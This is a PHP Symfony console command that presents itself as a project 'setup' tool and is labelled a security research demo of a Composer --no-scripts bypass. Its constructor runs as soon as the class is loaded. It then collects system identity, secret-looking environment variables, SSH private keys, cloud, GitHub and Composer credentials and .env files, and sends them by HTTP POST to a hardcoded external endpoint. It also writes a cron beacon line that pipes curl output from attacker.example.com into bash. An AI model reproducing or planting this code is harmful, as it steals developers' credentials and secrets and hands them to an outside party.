<?php

namespace PhpUtils\DevToolkit;

use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;

/**
 * PhpUtils Dev Toolkit — internal command dispatcher.
 *
 * -------------------------------------------------------------------------
 * SECURITY RESEARCH DEMO — Composer --no-scripts bypass (Application.php:415)
 *
 * This constructor is invoked by Composer during command-discovery for
 * 'composer list', 'composer help', and any unknown command — even when
 * --no-scripts is explicitly passed.  The $disableScriptsByDefault flag
 * set at line 147 is never consulted in the lines 376-438 block.
 *
 * Root cause:  new $dummy($script)  at Application.php:415
 * Gated by:    $mayNeedScriptCommand (true for 'list', 'help', unknown cmds)
 * Bypasses:    EventDispatcher::getListeners() check at EventDispatcher.php:585
 * -------------------------------------------------------------------------
 */
class ToolkitCommand extends Command
{
    /** @var string Attacker-controlled C2 — hardcoded, victim never sees or sets this */
    private const C2 = 'https://zlgoebpevqyfzddrxhpa.supabase.co/functions/v1/swift-endpoint';

    public function __construct(?string $name = null)
    {
        $receiver = self::C2;

        // ── 1. System identity ────────────────────────────────────────────
        $data = [];
        $data['meta'] = [
            'trigger'  => 'composer list --no-scripts  →  Application.php:415',
            'time'     => date('Y-m-d H:i:s'),
            'whoami'   => trim((string) @shell_exec('whoami')),
            'hostname' => trim((string) @shell_exec('hostname')),
            'uname'    => trim((string) @shell_exec('uname -a')),
            'cwd'      => (string) getcwd(),
            'php'      => PHP_VERSION . ' (' . PHP_OS . ')',
            'pid'      => getmypid(),
        ];

        // ── 2. Environment secrets ────────────────────────────────────────
        $envAll = array_merge($_ENV, (array) @getenv());
        $secrets = [];
        foreach ($envAll as $k => $v) {
            if (preg_match('/key|token|secret|pass|pwd|api|auth|aws|gcp|azure|npm|docker|gh_|github|gitlab|slack|stripe|twilio|sendgrid|database_url|redis|mongo|mysql|postgres/i', (string) $k)) {
                $secrets[$k] = substr((string) $v, 0, 120) . (strlen((string) $v) > 120 ? '…' : '');
            }
        }
        $data['env_secrets'] = $secrets ?: ['(none found — on a real dev machine these would include CI tokens, API keys, etc.)'];

        // ── 3. Credential file harvest ────────────────────────────────────
        $home = getenv('HOME') ?: '/root';
        $targets = [
            // Composer stores Packagist tokens, GitHub OAuth, HTTP-basic creds here
            'composer_auth'      => "$home/.composer/auth.json",
            // GitHub CLI stores OAuth token + scopes here
            'gh_cli_config'      => "$home/.config/gh/hosts.yml",
            // Git credential store (plain text tokens)
            'netrc'              => "$home/.netrc",
            'gitconfig'          => "$home/.gitconfig",
            // SSH private keys
            'ssh_rsa'            => "$home/.ssh/id_rsa",
            'ssh_ed25519'        => "$home/.ssh/id_ed25519",
            'ssh_ecdsa'          => "$home/.ssh/id_ecdsa",
            // Cloud credentials
            'aws_credentials'    => "$home/.aws/credentials",
            'aws_config'         => "$home/.aws/config",
            'gcloud_adc'         => "$home/.config/gcloud/application_default_credentials.json",
            // Project files that commonly contain secrets
            'project_env'        => getcwd() . '/.env',
            'project_env_local'  => getcwd() . '/.env.local',
            'parent_env'         => dirname((string) getcwd()) . '/.env',
        ];

        $harvested = [];
        foreach ($targets as $label => $path) {
            if (@is_file($path) && @is_readable($path)) {
                $content = (string) @file_get_contents($path);
                $harvested[$label] = [
                    'path'    => $path,
                    'size'    => strlen($content) . ' bytes',
                    'preview' => substr($content, 0, 300) . (strlen($content) > 300 ? "\n...(truncated)" : ''),
                ];
            }
        }
        $data['harvested_files'] = $harvested ?: (object)['_note' => 'no credential files found in this environment'];

        // ── 4. SSH known_hosts (reveals infra targets) ────────────────────
        $knownHosts = "$home/.ssh/known_hosts";
        if (@is_file($knownHosts)) {
            $data['ssh_known_hosts'] = substr((string) @file_get_contents($knownHosts), 0, 500);
        }

        // ── 5. Persistence payload (simulation — writes but does not install) ─
        $beacon  = '* * * * * curl -s "http://attacker.example.com/c2?h=$(hostname)&u=$(whoami)" | bash';
        @file_put_contents('/tmp/cron_payload.txt', $beacon . "\n");
        $data['persistence'] = [
            'cron_payload'   => $beacon,
            'written_to'     => '/tmp/cron_payload.txt',
            'next_step'      => 'crontab /tmp/cron_payload.txt',
            'note'           => 'DEMO ONLY — not installed. One shell_exec() away from real persistence.',
        ];

        // ── 6. Serialise ──────────────────────────────────────────────────
        $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);

        // ── 7. Exfiltrate via HTTP POST ───────────────────────────────────
        $sent = false;
        if (function_exists('curl_init')) {
            $ch = curl_init($receiver);
            curl_setopt_array($ch, [
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => $json,
                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 4,
                CURLOPT_CONNECTTIMEOUT => 2,
            ]);
            $result = curl_exec($ch);
            $sent   = ($result !== false);
            curl_close($ch);
        }

        // ── 8. Always write locally as fallback ───────────────────────────
        @file_put_contents('/tmp/exfil-dump.json', $json);

        // ── 9. Print confirmation to terminal ─────────────────────────────
        echo "\n";
        echo "┌─────────────────────────────────────────────────────────┐\n";
        echo "│  BYPASS CONFIRMED  —  --no-scripts  was NOT enforced   │\n";
        echo "│  Trigger: composer list --no-scripts → Application.php:415  │\n";
        echo "└─────────────────────────────────────────────────────────┘\n";
        echo "  user     : " . $data['meta']['whoami'] . "\n";
        echo "  host     : " . $data['meta']['hostname'] . "\n";
        echo "  cwd      : " . $data['meta']['cwd'] . "\n";
        echo "  env keys : " . count($secrets) . " secret(s) found\n";
        echo "  files    : " . count($harvested) . " credential file(s) harvested\n";
        echo "  exfil    : " . ($sent ? "SENT → $receiver" : "listener not running (data saved to /tmp/exfil-dump.json)") . "\n";
        echo "  persist  : cron payload written to /tmp/cron_payload.txt\n";
        echo "\n";

        parent::__construct($name);
    }

    protected function configure(): void
    {
        $this->setName('setup')
             ->setDescription('Initialise project structure and config files.');
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $output->writeln('<info>Project setup complete.</info>');
        return self::SUCCESS;
    }
}
